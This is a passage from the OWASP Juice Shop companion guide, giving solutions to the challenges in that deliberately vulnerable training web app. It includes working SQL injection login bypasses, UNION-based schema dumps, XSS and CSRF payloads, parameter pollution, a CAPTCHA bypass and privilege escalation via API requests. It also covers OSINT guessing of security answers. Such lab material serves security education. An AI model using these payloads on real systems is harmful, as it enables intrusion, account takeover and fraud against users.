include::../attributes.adoc[]

All URLs in the challenge solutions assume you are running the
application locally and on the default port http://localhost:3000.
Change the URL accordingly if you use a different root URL.

Often there are multiple ways to solve a challenge. In most cases just
one possible solution is presented here. This is typically the easiest
or most obvious one from the author's perspective.

_The challenge solutions found in this release of the companion guide
are compatible with {juiceShopVersion} of OWASP Juice Shop._

== ⭐ Challenges

=== Receive a coupon code from the support chatbot

. Log in as any user.
. Click _Support Chat_ in the sidebar menu to visit
http://localhost:3000/#/chatbot.
. After telling the chatbot your name you can start chatting with it.
. Ask it something similar to "Can I have a coupon code?" or "Please
give me a discount!" and it will most likely decline with some
unlikely excuse.
. Keep asking for discount again and again until you finally receive a
10% coupon code for the current month! This also solves the challenge
immediately.

=== Use the bonus payload in the DOM XSS challenge

. Solve the <<_perform_a_dom_xss_attack,Perform a DOM XSS attack>>
challenge
. Turn on your computer's speakers!
. Paste the payload `+<iframe width="100%" height="166" scrolling="no"
frameborder="no" allow="autoplay"
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>+`
into the _Search..._ field and hit Enter
. Enjoy the excellent acoustic entertainment!

=== Access a confidential document

. Follow the link to titled _Check out our boring terms of use if you
are interested in such lame stuff_
(http://localhost:3000/ftp/legal.adoc) on the _About Us_ page.
. Successfully attempt to browse the directory by changing the URL into
http://localhost:3000/ftp
+
image::appendix/ftp_directory.png[FTP directory browser]

. Open http://localhost:3000/ftp/acquisitions.adoc to solve the
challenge.

=== Provoke an error that is neither very gracefully nor consistently handled

Any request that cannot be properly handled by the server will
eventually be passed to a global error handling component that sends an
error page to the client that includes a stack trace and other sensitive
information. The restful API behaves similarly, passing back a JSON
error object with sensitive data, such as SQL query strings.

Here are two examples (out of many ways) to provoke such an error
situation and solve this challenge immediately:

* Visit http://localhost:3000/rest/qwertz
+
image::appendix/error_page-500.png[500 Error]

* Log in to the application with `'` (single-quote) as _Email_ and
anything as _Password_
+
image:appendix/login-error_js.png[Object Error in Login form]
image:appendix/error_js-console.png[SQL error in JS console]

=== Find the endpoint that serves usage data to be scraped by a popular monitoring system

. Scroll through https://prometheus.io/docs/introduction/first_steps
. You should notice several mentions of `/metrics` as the default path
scraped by Prometheus, e.g. "Prometheus expects metrics to be
available on targets on a path of `/metrics`."
. Visit http://localhost:3000/metrics to view the actual Prometheus
metrics of the Juice Shop and solve this challenge

=== Close multiple "Challenge solved"-notifications in one go

. Read the xref:../part1/challenges.adoc#_success_notifications[Success Notifications] section
. It will explain that `Shift`-clicking the _X_-button on any "Challenge solved"-notification will close all open notifications of this kind
. Solve any other challenge (or multiple) and then `Shift`-click the _X_-button on it to solve this challenge

If you already have solved all but this challenge, you can just restart your Juice Shop instance to see all previous notifications again and then perform step 3 as described above.

=== Retrieve the photo of Bjoern's cat in "melee combat-mode"

. Visit http://localhost:3000/#/photo-wall
. Right-click _Inspect_ the broken image in the entry labeled "😼
#zatschi #whoneedsfourlegs"
. You should find an image tag similar to `<img _ngcontent-akt-c18=""
class="image"
src="assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg"
alt="😼 #zatschi #whoneedsfourlegs">` in the source
. Right-click _Open in new tab_ the `src` element of the image
. Observe (in your DevTools _Network_ tab) that the request sent to the
server is
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-
. The culprit here are the two `#` characters in the URL, which are no
problem for your OS in a filename, but are interpreted by your
browser as HTML anchors. Thus, they are not transmitted to the server
at all.
. To get them over to the server intact, they must obviously be
URL-encoded into `%23`
. Open
http://localhost:3000/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
and enjoy the incredibly cute photo of this pet being happy despite
missing half a hind leg
. Go back to the application, and the challenge will be solved.

=== Let us redirect you to one of our crypto currency addresses

. Log in to the application with any user.
. Visit the _Your Basket_ page and expand the _Payment_ and
_Merchandise_ sections with the "credit card"-button.
. Perceive that all donation links are passed through the `to`
parameter of the route `/redirect`
. Open `main.js` in your browser's DevTools
. Searching for `/redirect?to=` and stepping through all matches you
will notice three functions that are called only from hidden buttons
on the _Your Basket_ page:
+
image::appendix/cryptoLinks.png[Hidden crypto currency link functions]

. Open one of the three, e.g.
http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
to solve the challenge.

=== Read our privacy policy

. Log in to the application with any user.
. Open the dropdown menu on your profile picture and choose _Privacy &
Security_.
. You will find yourself on
http://localhost:3000/#/privacy-security/privacy-policy which
instantly solves this challenge for you.

=== Follow the DRY principle while registering a user

. Go to http://localhost:3000/#/register.
. Fill out all required information except the _Password_ and _Repeat
Password_ field.
. Type e.g. `12345` into the _Password_ field.
. Now type `12345` into the _Repeat Password_ field. While typing the
numbers you will see _Passwords do not match_ errors until you reach
`12345`.
. Finally, go back to the _Password_ field and change it into any other
password. The _Repeat Password_ field does not show the expected
error.
. Submit the form with _Register_ which will solve this challenge.

=== Find the carefully hidden 'Score Board' page

. Go to the _Sources_ tab of your browsers DevTools and open the
`main.js` file.
. If your browser offers pretty-printing of this minified messy code,
best use this offer. In Chrome this can be done with the "{}"-button.
. Search for `score` and iterate through each finding to come across
one looking like a route mapping section:
+
image::appendix/score-board_route.png[Route Mapping the the Score Board]

. Navigate to http://localhost:3000/#/score-board to solve the
challenge.
. From now on you will see the additional menu item _Score Board_ in
the navigation bar.

=== Perform a DOM XSS attack

. Paste the attack string `<iframe src="javascript:alert(`xss`)">`
into the _Search..._ field.
. Hit the Enter key.
. An alert box with the text "xss" should appear.
+
image::appendix/xss1_alert.png[XSS alert box]

=== Give a devastating zero-star feedback to the store

Place an order that makes you rich. Visit the _Contact Us_ form and put
in a _Comment_ text. Also solve the CAPTCHA at the bottom of the form.

. The _Submit_ button is still *disabled* because you did not select
a _Rating_ yet.
. Inspect the _Submit_ button with your DevTools and note the
`disabled` attribute of the `<button>` HTML tag
. Double click on `disabled` attribute to select it and then delete it
from the tag.
+
image::appendix/contact_disabled_submit-button.png[Disabled Submit Button in Contact Us form]

. The _Submit_ button is now *enabled*.
. Click the _Submit_ button to solve the challenge.
. You can verify the feedback was saved by checking the _Customer
Feedback_ widget on the _About Us_ page.
+
image::appendix/zero_star_feedback-carousel.png[Zero star feedback in carousel]

== ⭐⭐ Challenges

=== Access the administration section of the store

. Open the `main.js` in your browser's developer tools and
search for "admin".
. One of the matches will be a route mapping to `path:
"administration"`.
+
image::appendix/minified_js-admin.png[Administration page route in main.js]

. Navigating to http://localhost:3000/#/administration will give a `403
Forbidden` error.
. Log in to an administrator's account by solving the challenge
 ** <<_log_in_with_the_administrators_user_account,Log in with the administrator's user account>>
or
 ** <<_log_in_with_the_administrators_user_credentials_without_previously_changing_them_or_applying_sql_injection,Log in with the administrator's user credentials without previously changing them or applying SQL Injection>>
first and then navigate to http://localhost:3000/#/administration
will solve the challenge.

=== View another user's shopping basket

. Log in as any user.
. Put some products into your shopping basket.
. Inspect the _Session Storage_ in your browser's developer tools to
find a numeric `bid` value.
+
image::appendix/session_storage.png[Basket ID in Session Storage]

. Change the `bid`, e.g. by adding or subtracting 1 from its value.
. Visit http://localhost:3000/#/basket to solve the challenge.

If the challenge is not immediately solved, you might have to
`F5`-reload to relay the `bid` change to the Angular client.

=== Use a deprecated B2B interface that was not properly shut down

. Log in as any user.
. Click _Complain?_ in the _Contact Us_ dropdown to go to the _File
Complaint_ form
. Clicking the file upload button for _Invoice_ and browsing some
directories you might notice that `.pdf` and `.zip` files are
filtered by default
. Trying to upload another other file will probably give you an error
message on the UI stating exactly that: `Forbidden file type. Only
PDF, ZIP allowed.`
. Open the `main.js` in your DevTools and find the declaration
of the file upload (e.g. by searching for `zip`)
. In the `allowedMimeType` array you will notice `"application/xml"`
and `"text/xml"` along with the expected PDF and ZIP types
+
image::appendix/complaint_xml_mime-type.png[Possible XML upload spoilered in main.js]

. Click on the _Choose File_ button.
. In the _File Name_ field enter `*.xml` and select any arbitrary XML
file (<100KB) you have available. Then press _Open_.
. Enter some _Message_ text and press _Submit_ to solve the challenge.
. On the JavaScript Console of your browser you will see a suspicious
`410 (Gone)` HTTP Error. In the corresponding entry in the Network
section of your browser's DevTools, you should see an error message,
telling you that `B2B customer complaints via file upload have been
deprecated for security reasons!`

=== Get rid of all 5-star customer feedback

. Log in to the application with any user.
. Solve
<<_access_the_administration_section_of_the_store,Access the administration section of the store>>
+
image::appendix/customer_feedback-table.png[Feedback table on Administration page]

. Delete all entries with five star rating from the _Customer Feedback_
table using the trashcan button

=== Log in with the administrator's user account

* Log in with _Email_ `' or 1=1--` and any _Password_ which will
authenticate the first entry in the `Users` table which coincidentally
happens to be the administrator
* or log in with _Email_ `admin@juice-sh.op'--` and any _Password_ if
you already know the email address of the administrator
* or log in with _Email_ `admin@juice-sh.op` and _Password_ `admin123`
if you looked up the administrator's password hash
`0192023a7bbd73250516f069df18b500` in a rainbow table after harvesting
the user data by
<<_retrieve_a_list_of_all_user_credentials_via_sql_injection,retrieving a list of all user credentials via SQL Injection>>.

=== Log in with MC SafeSearch's original user credentials

. Reading the hints for this challenge or googling "MC SafeSearch" will
eventually bring the music video
https://www.youtube.com/watch?v=v59CX2DiX0Y["Protect Ya' Passwordz"]
to your attention.
. Watch this video to learn that MC used the name of his dog "Mr.
Noodles" as a password but changed "some vowels into zeroes".
. Visit http://localhost:3000/#/login and log in with _Email_
`mc.safesearch@juice-sh.op` and _Password_ `Mr. N00dles` to solve
this challenge.

=== Log in with the administrator's user credentials without previously changing them or applying SQL Injection

. Visit http://localhost:3000/#/login.
. Log in with _Email_ `admin@juice-sh.op` and _Password_ `admin123`
which is as easy to guess as it is to brute force or retrieve from a
rainbow table.

=== Behave like any "white hat" should before getting into the action

. Visit https://securitytxt.org/ to learn about a proposed standard
which allows websites to define security policies.
. Request the security policy file from the server at
http://localhost:3000/.well-known/security.txt or
http://localhost:3000/security.txt to solve the challenge.
. Optionally, write an email to the mentioned contact address
link:mailto:donotreply@owasp-juice.shop[donotreply@owasp-juice.shop] and see what happens... :e-mail:

=== Inform the shop about an algorithm or library it should definitely not use the way it does

Juice Shop uses some inappropriate crypto algorithms and libraries in
different places. While working on the following topics (and having the
`package.json.bak` at hand) you will learn those inappropriate choices
in order to exploit and solve them:

* <<_forge_a_coupon_code_that_gives_you_a_discount_of_at_least_80,Forge a coupon code that gives you a discount of at least 80%>>
exploits `z85` (Zero-MQ Base85 implementation) as the library for
coupon codes.
* <<_solve_challenge_999,Solve challenge #999>> requires you to create a
valid hash with the `hashid` library.
* Passwords in the `Users` table are hashed with unsalted MD5
* Users registering via Google account will receive a very silly default
password that involves Base64 encoding.

//

. Visit http://localhost:3000/#/contact.
. Submit your feedback with one of the following words in the comment:
`z85`, `base85`, `base64`, `md5` or `hashid`.

=== Perform a reflected XSS attack

. Log in as any user.
. Do some shopping and then visit the _Order History_.
. Clicking on the little "Truck" button for any of your orders will
show you the delivery status of your order.
. Notice the `id` parameter in the URL
http://localhost:3000/#/track-result?id=fe01-f885a0915b79f2a9 with
`fe01-f885a0915b79f2a9` being one of your order numbers?
. As the `fe01-f885a0915b79f2a9` is displayed on the screen, it might
be susceptible to an XSS attack.
. Paste the attack string `<iframe src="javascript:alert(`xss`)">`
into that URL so that you have
http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
. Refresh that URL to get the XSS payload executed and the challenge
marked as solved.
+
image::appendix/xss0_alert.png[XSS alert box]

=== Determine the answer to John's security question

. Go to the photo wall and search for the photo that has been posted by
the user `j0hNny`.
. Download that photo.
. Check the metadata of the photo. You can use various tools online
like http://exif.regex.info/exif.cgi
. When viewing the metadata, you can see the coordinates of where the
photo was taken. The coordinates are `36.958717N 84.348217W`
. Search for these coordinates on Google to find out in which forest
the photo was taken. It can be seen that the `Daniel Boone National
Forest` is located on these coordinates.
. Go to the login page and click on _Forgot your password?_.
. Fill in `john@juice-sh.op` as the email and `Daniel Boone National
Forest` as the answer of the security question.
. Choose a new password and click on _Change_.

=== Determine the answer to Emma's security question

. Go to the photo wall and search for the photo that has been posted by
the user `E=ma²`.
. Open the image so that you can zoom in on it.
. On the far left window on the middle floor, you can see a logo of a
company. It can be seen that logo shows the name `ITsec`.
. Go to the login page and click on _Forgot your password?_.
. Fill in `emma@juice-sh.op` as the email and `ITsec` as the answer of
the security question.
. Choose a new password and click on _Change_.

== ⭐⭐⭐ Challenges

=== Register as a user with administrator privileges

. Submit a `POST` request to http://localhost:3000/api/Users with:
 ** `{"email":"admin","password":"admin","role":"admin"}` as body
 ** and `application/json` as `Content-Type`

+
image::appendix/register-admin_postman.png[Admin user registration request via Postman]
. Upon your next visit to the application's web UI the challenge will
be marked as solved.

=== Put an additional product into another user's shopping basket

. Log in as any user.
. Inspect HTTP traffic while putting items into your own shopping
basket to learn your own `BasketId`. For this solution we assume
yours is `1` and another user's basket with a `BasketId` of `2`
exists.
. Submit a `POST` request to http://localhost:3000/api/BasketItems
with payload as `{"ProductId": 14,"BasketId": "2","quantity": 1}`
making sure no product of that with `ProductId` of `14` is already in
the target basket. Make sure to supply your `Authorization Bearer`
token in the request header.
. You will receive a (probably unexpected) response of `{'error' :
'Invalid BasketId'}` - after all, it is not your basket!
. Change your `POST` request into utilizing HTTP Parameter Pollution
(HPP) by supplying your own `BasketId` _and_ that of someone else in
the same payload, i.e. `{"ProductId": 14,"BasketId": "1","quantity":
1,"BasketId": "2"}`.
. Submitting this request will satisfy the validation based on your own
`BasketId` but put the product into the other basket!

ℹ️ With other ``BasketId``s you might need to play with the order of the
duplicate property a bit and/or make sure your own `BasketId` is lower
than the one of the target basket to make this HPP vulnerability work in
your favor.

____
Supplying multiple HTTP parameters with the same name may cause an
application to interpret values in unanticipated ways. By exploiting
these effects, an attacker may be able to bypass input validation,
trigger application errors or modify internal variables values. As
HTTP Parameter Pollution (in short HPP) affects a building block of
all web technologies, server and client side attacks exist.

Current HTTP standards do not include guidance on how to interpret
multiple input parameters with the same name. For instance, RFC 3986
simply defines the term Query String as a series of field-value pairs
and RFC 2396 defines classes of reserved and unreserved query string
characters. Without a standard in place, web application components
handle this edge case in a variety of ways (see the table below for
details).

By itself, this is not necessarily an indication of vulnerability.
However, if the developer is not aware of the problem, the presence of
duplicated parameters may produce an anomalous behavior in the
application that can be potentially exploited by an attacker. As often
in security, unexpected behaviors are a usual source of weaknesses
that could lead to HTTP Parameter Pollution attacks in this case. To
better introduce this class of vulnerabilities and the outcome of HPP
attacks, it is interesting to analyze some real-life examples that
have been discovered in the past. footnote:7[https://wiki.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)]
____

=== Submit 10 or more customer feedbacks within 10 seconds

. Open the Network tab of your browser DevTools and visit
http://localhost:3000/#/contact
. You should notice a `GET` request to
http://localhost:3000/rest/captcha/ which retrieves the CAPTCHA for
the feedback form. The HTTP response body will look similar to
`{"captchaId":18,"captcha":"5*8*8","answer":"320"}`.
. Fill out the form normally and submit it while checking the backend
interaction in your Developer Tools. The CAPTCHA identifier and
solution are transmitted along with the feedback in the request body:
`{comment: "Hello", rating: 1, captcha: "320", captchaId: 18}`
. You will notice that a new CAPTCHA is retrieved from the REST
endpoint. It will present a different math challenge, e.g.
`{"captchaId":19,"captcha":"1*1-1","answer":"0"}`
. Write another feedback but before sending it, change the `captchaId`
and `captcha` parameters to the previous values of `captchaId` and
`answer`. In this example you would submit `captcha: "320",
captchaId: 18` instead of `captcha: "0", captchaId: 19`.
. The server will accept your feedback, telling your that the CAPTCHA
can be pinned to any previous one you like.
. Write a script with a 10-iteration loop that submits feedback using
your pinned `captchaId` and `captcha` parameters. Running this script
will solve the challenge.

Two alternate (but more complex) solutions:

* Rewrite your script so that it _parses the response from each CAPTCHA
retrieval call_ to http://localhost:3000/rest/captcha/ and sets the
extracted `captchaId` and `answer` parameters in each subsequent form
submission as `captchaId` and `captcha`.
* Using an automated browser test tool like
https://www.seleniumhq.org/[Selenium WebDriver] you could do the
following:
 .. Read the CAPTCHA question from the HTML element `+<code id="captcha"
...>+`
 .. Calculate the result on the fly using JavaScript
 .. Let WebDriver write the answer into the `+<input
name="feedbackCaptcha" ...>+` field.

The latter is actually the way it is implemented in the end-to-end test
for this challenge:

[,javascript]
----
  describe('challenge "captchaBypass"', () => {
   it('should be possible to post 10 or more customer feedbacks in less than 20 seconds', () => {
      cy.window().then(async () => {
         for (let i = 0; i < 15; i++) {
            const response = await fetch(
                    `${Cypress.env('baseUrl')}/rest/captcha/`,
                    {
                       method: 'GET',
                       headers: {
                          'Content-type': 'text/plain'
                       }
                    }
            )
            if (response.status === 200) {
               const responseJson = await response.json()

               await sendPostRequest(responseJson)
            }

            async function sendPostRequest (captcha: {
               captchaId: number
               answer: string
            }) {
               await fetch(`${Cypress.env('baseUrl')}/api/Feedbacks`, {
                  method: 'POST',
                  cache: 'no-cache',
                  headers: {
                     'Content-type': 'application/json'
                  },
                  body: JSON.stringify({
                     captchaId: captcha.captchaId,
                     captcha: `${captcha.answer}`,
                     comment: `Spam #${i}`,
                     rating: 3
                  })
               })
            }
         }
      })
      cy.expectChallengeSolved({ challenge: 'CAPTCHA Bypass' })
   })
})
----

_It is worth noting that both alternate solutions would still work even
if the CAPTCHA-pinning problem would be fixed in the application!_

Last but not least, the following
https://github.com/aaronhnatiw/race-the-web[RaceTheWeb] config could
be used to solve this challenge. Other than the two above alternate
solutions, this one relies on CAPTCHA-pinning:

[,toml]
----
# CAPTCHA Bypass
# Save this as captcha-bypass.toml
# Get Captcha information from this endpoint first: http://localhost:3000/rest/captcha/
# Then replace captchaId and captcha values in body parameter of this file
# Launch this file by doing ./racethweb captcha-bypass.toml
count = 10
verbose = true
[[requests]]
    method = "POST"
    url = "http://localhost:3000/api/Feedbacks/"
    body = "{\"captchaId\":12,\"captcha\":\"-1\",\"comment\":\"pwned2\",\"rating\":5}"
    headers = ["Content-Type: application/json"]
----

=== Change the name of a user by performing Cross-Site Request Forgery from another origin

. Open Juice Shop in a web browser which sets cookies with `SameSite=None`
by default. With Firefox 96.x or Chrome 79.x this has been successfully tested, but feel free to try other browsers at your leisure.
. Login with any user account. This user is going to be the victim of
the CSRF attack.
. Navigate to http://htmledit.squarefree.com in the same browser. It
is intentional that the site is accessed without TLS, as otherwise
there might be issues with the mixed-content policy of the browser.
. In the upper frame of the page, paste the following HTML fragment,
which contains a self-submitting HTML form:

[,html]
----
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="CSRF"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
----

. The attack is performed immediately. You will see an error message or
a blank page in the lower frame, because even though the online HTML
editor is allowed to send requests to Juice Shop, it is not permitted
to embed the response.
. Verify that the username got changed to "CSRF" by checking the
http://localhost:3000/profile[profile page].

In an actual attack scenario, the attacker will try to trick a
legitimate user into opening an attacker-controlled website. If the
victim is simultaneously logged into the target website, the requested
that is generated by the malicious form in step 3 is authenticated with
the victim's session. The attacker has also options to hide the
automatically issued request, for example by embedding it into an inline
frame of zero height and width.

=== Exfiltrate the entire DB schema definition via SQL Injection

. From any errors seen during previous SQL Injection attempts you
should know that SQLite is the relational database in use.
. Check https://www.sqlite.org/faq.html to learn in "(7) How do I
list all tables/indices contained in an SQLite database" that the
schema is stored in a system table `sqlite_master`.
. You will also learn that this table contains a column `sql` which
holds the text of the original `CREATE TABLE` or `CREATE INDEX`
statement that created the table or index. Getting your hands on this
would allow you to replicate the entire DB schema.
. During the
<<_order_the_christmas_special_offer_of_2014,Order the Christmas special offer of 2014>>
challenge you learned that the `/rest/products/search` endpoint is
susceptible to SQL Injection into the `q` parameter.
. The attack payload you need to craft is a `UNION SELECT` merging the
data from the `sqlite_master` table into the products returned in the
JSON result.
. As a starting point we use the known working `'))--` attack pattern
and try to make a `UNION SELECT` out of it
. Searching for `')) UNION SELECT * FROM x--` fails with a
`SQLITE_ERROR: no such table: x` as you would expect.
. Searching for `')) UNION SELECT * FROM sqlite_master--` fails with a
promising `SQLITE_ERROR: SELECTs to the left and right of UNION do
not have the same number of result columns` which least confirms the
table name.
. The next step in a `UNION SELECT`-attack is typically to find the
right number of returned columns. As the _Search Results_ table in
the UI has 3 columns displaying data, it will probably at least be
three. You keep adding columns until no more `SQLITE_ERROR` occurs
(or at least it becomes a different one):
 .. `')) UNION SELECT '1' FROM sqlite_master--` fails with `number of
result columns` error
 .. `')) UNION SELECT '1', '2' FROM sqlite_master--` fails with
`number of result columns` error
 .. `')) UNION SELECT '1', '2', '3' FROM sqlite_master--` fails with
`number of result columns` error
 .. (...)
 .. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
sqlite_master--` _still fails_ with `number of result columns`
error
 .. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
sqlite_master--` finally gives you a JSON response back with an
extra element
`{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
. Next you get rid of the unwanted product results changing the query
into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
'6', '7', '8', '9' FROM sqlite_master--` leaving only the
"``UNION``ed" element in the result set
. The last step is to replace one of the fixed values with correct
column name `sql`, which is why searching for `qwert')) UNION SELECT
sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--`
solves the challenge.

=== Obtain a Deluxe Membership without paying for it

. If wallet is empty: a. Go to
http://localhost:3000/#/payment/deluxe and look at the
available payment options for upgrading to a deluxe account b. Open
devtools and inspect the pay button next to the "pay using wallet"
option. c. Remove the disabled="true" attribute from the element to
enable it. d. Switch to the network tab and devtools and click on the
button to initiate payment e. See that there is a POST request sent,
which only contains one parameter in the request payload,
"paymentMode", which is set to "wallet". The response contains an
error saying your wallet doesn't contain sufficient funds d. Right
click on the request and select "edit and resend" e. Change the
paymentMode parameter to an empty string and press send. This solves
the challenge and juice-shop no longer knows where to deduct the
money from
. If wallet isn't empty: a. If your wallet contains funds, you cannot
start a dummy transaction to inspect the request structure because
then you would be automatically upgraded to deluxe. b. Set up a proxy
like OWASP ZAP, Fiddler aur Burp Suite. c. Click on the pay button d.
Intercept and edit the request as described above before forwarding
it.

=== Post some feedback in another user's name

. Go to the _Contact Us_ form on http://localhost:3000/#/contact.
. Inspect the DOM of the form in your browser to spot this suspicious
text field right at the top: `<input _ngcontent-c23 hidden
id="userId" type="text" class="ng-untouched ng-pristine ng-valid">`
+
image::appendix/hidden_textfield.png[Hidden text field on Contact Us form]

. In your browser's developer tools remove the `hidden` attribute from
above `<input>` tag.
+
image::appendix/spoofed_feedback.png[Spoofed feedback ready for submit]

. The field should now be visible in your browser. Type any user's
database identifier in there (other than your own if you are
currently logged in) and submit the feedback.

You can also solve this challenge by directly sending a `POST` to
http://localhost:3000/api/Feedbacks endpoint. You could for example be
logged out but provide any `UserId` in the JSON payload.

=== Post a product review as another user or edit any user's existing review

. Select any product and write a review for it
image:appendix/normal_review.png[Simple product review]
. Submit the review while observing the `Networks` tab of your browser.
. Analyze the `PUT` request.
image:appendix/normal_review_request.png[normal product request]
. Change the author name to `admin@juice-sh.op` in `Request Body` and
re-send the request.

=== Log in with Chris' erased user account

* Log in with _Email_ `chris.pike@juice-sh.op'--` and any _Password_ if
you already know the email address of Chris.
* or log in with _Email_ as `\' or deletedAt IS NOT NULL--` and any
_Password_ you like for a "lucky hit" as Chris seems to be the only or
at least first ever deleted user. The presence of `deletedAt` you
might have derived from
<<_retrieve_a_list_of_all_user_credentials_via_sql_injection,Retrieve a list of all user credentials via SQL Injection>>
and enforcing it to be `NOT NULL` will give you back only users who
were soft-deleted at some point of time.

=== Log in with Amy's original user credentials

. Google for either `93.83 billion trillion trillion centuries` or `One
Important Final Note`.
. Both searches should show https://www.grc.com/haystack.htm as one
of the top hits.
. After reading up on _Password Padding_ try the example password
`+D0g.....................+`
. She actually did a very similar padding trick, just with the name of
her husband _Kif_ written as _K1f_ instead of _D0g_ from the example!
She did not even bother changing the padding length!
. Visit http://localhost:3000/#/login and log in with credentials
`amy@juice-sh.op` and password `+K1f.....................+` to solve
the challenge

=== Log in with Bender's user account

* Log in with _Email_ `bender@juice-sh.op'--` and any _Password_ if you
already know the email address of Bender.
* A rainbow table attack on Bender's password will probably fail as it
is rather strong. You can alternatively solve
<<_change_benders_password_into_slurmcl4ssic_without_using_sql_injection_or_forgot_password,Change Bender's password into _slurmCl4ssic_ without using SQL Injection or Forgot Password>>
first and then simply log in with the new password.

=== Log in with Jim's user account

* Log in with _Email_ `jim@juice-sh.op'--` and any _Password_ if you
already know the email address of Jim.
* or log in with _Email_ `jim@juice-sh.op` and _Password_ `ncc-1701` if
you looked up Jim's password hash in a rainbow table after harvesting
the user data as described in
<<_retrieve_a_list_of_all_user_credentials_via_sql_injection,Retrieve a list of all user credentials via SQL Injection>>.

=== Place an order that makes you rich

. Log in as any user.
. Put at least one item into your shopping basket.
. Note that reducing the quantity of a basket item below 1 is not
possible via the UI
. When changing the quantity via the UI, you will notice `PUT` requests
to http://localhost:3000/api/BasketItems/{id}[http://localhost:3000/api/BasketItems/\{id}] in the Network tab of
your DevTools
. Memorize the `+{id}+` of any item in your basket
. Copy your `Authorization` header from any HTTP request submitted via
browser.
. Submit a `PUT` request to
http://localhost:3000/api/BasketItems/{id}[http://localhost:3000/api/BasketItems/\{id}] replacing `+{id}+` with
the memorized number from 5. and with:
 ** `{"quantity": -100}` as body,
 ** `application/json` as `Content-Type`
 ** and `Bearer ?` as `Authorization` header, replacing the `?` with
the token you copied from the browser.

+
image::appendix/negative_order_postman-body.png[Negative quantity request body in PostMan]
. Visit http://localhost:3000/#/basket to view _Your Basket_ with the
negative quantity on the first item
+
image::appendix/negative_order-basket.png[Basket with negative item quantity]

. Click _Checkout_ to issue the negative order and solve this
challenge.
+
image::appendix/negative_order_pdf.pdf.png[Order confirmation with negative total]

=== Prove that you actually read our privacy policy

. Open http://localhost:3000/#/privacy-security/privacy-policy.
. Moving your mouse cursor over each paragraph will make a fire-effect
appear on certain words or partial sentences.
+
image::appendix/privacy-policy_hot-section.png[Hot section in the privacy policy]

. Inspect the HTML in your browser and note down all text inside `<span
class="hot">` tags, which are `+http://localhost+`, `We may also`,
`instruct you`, `to refuse all`, `reasonably necessary` and
`responsibility`.
. Combine those into the URL
http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
(adding the server port if needed) and solve the challenge by
visiting it.

It seems the Juice Shop team did not appreciate your extensive reading
effort enough to provide even a tiny gratification, as you will receive
only a `404 Error: ENOENT: no such file or directory, stat
'/app/frontend/dist/frontend/assets/private/thank-you.jpg'`.

=== Change the href of the link within the O-Saft product description

. By searching for _O-Saft_ directly via the REST API with
http://localhost:3000/rest/products/search?q=o-saft you will learn
that it's database ID is `9`.
. Submit a `PUT` request to http://localhost:3000/api/Products/9
with:
 ** `+{"description": "<a href=\"https://owasp.slack.com\"
target=\"_blank\">More...</a>"}+` as body
 ** and `application/json` as `Content-Type`

+
image::appendix/osaft_postman-body.png[O-Saft link update via PostMan]

=== Reset the password of Bjoern's OWASP account via the Forgot Password mechanism

. Visit http://localhost:3000/#/forgot-password and provide
   `bjoern@owasp.org` as your _Email_.
. You will notice that the security question Bjoern chose is _Name of your
favorite pet?_
. Find Bjoern's Twitter profile at https://twitter.com/bkimminich
. Going through his status updates or media you'll spot a few photos of a cute cat and eventually also find the Tweet https://twitter.com/bkimminich/status/1441659996589207555 or maybe the more recent https://twitter.com/bkimminich/status/1594985736650035202
. The text of this Tweet spoilers the name of the cat as "Zaya"
. Visit http://localhost:3000/#/forgot-password again and once more provide
`bjoern@owasp.org` as your _Email_.
. In the subsequently appearing form, provide `Zaya` as _Name of your
favorite pet?_
. Then type any _New Password_ and matching _Repeat New Password_
. Click _Change_ to solve this challenge

image::appendix/zaya_rowing.png[Zaya "rowing" with a half-amputated hind leg in a Tweet of Bjoern]

image::appendix/zaya_flippered.png[Zaya in a box in another Tweet of Bjoern]

==== Alternative name-drop on YouTube

. Find Bjoern's
https://www.youtube.com/playlist?list=PLV9O4rIovHhO1y8_78GZfMbH6oznyx2g2[_OWASP Juice Shop_ playlist on Youtube]
. Watch
https://www.youtube.com/watch?v=Lu0-kDdtVf4[BeNeLux Day 2018: Juice Shop: OWASP's Most Broken Flagship - Björn Kimminich]
. This conference talk recording immediately dives into a demo of the
Juice Shop application in which Bjoern starts registering a new
account 3:59 into the video (https://youtu.be/Lu0-kDdtVf4?t=239)
. Bjoern picks _Name of your favorite pet?_ as his security question
and - live on camera - answers it truthfully with "Zaya", the name of
his family's adorable three-legged cat.

==== Partial hints about Bjoern's choice of security answer

The *user profile picture* of his account at
http://localhost:3000/assets/public/images/uploads/12.jpg shows his
pet cat.

image::appendix/zaya_window.jpg[Zaya at window]

Retrieving another photo of his cat is the subject of the
xref:../part2/improper-input-validation.adoc#_retrieve_the_photo_of_bjoerns_cat_in_melee_combat_mode[Retrieve the photo of Bjoern's cat in "melee combat-mode"]
challenge. The corresponding image caption "😼 #zatschi
#whoneedsfourlegs" also leaks the nickname "Zatschi" of the pet - which
is cute, but (intentionally) not very helpful to find out her real name,
though.

image::appendix/zaya_melee.jpg[Zaya in melee combat mode]

=== Reset Jim's password via the Forgot Password mechanism

. Visit http://localhost:3000/#/forgot-password and provide
`jim@juice-sh.op` as your _Email_ to learn that _Your eldest siblings
middle name?_ is Jim's chosen security question
. Jim (whose `UserId` happens to be `2`) left some breadcrumbs in the
application which reveal his identity
 ** A product review for the _OWASP Juice Shop-CTF Velcro Patch_
stating _"Looks so much better on my uniform than the boring
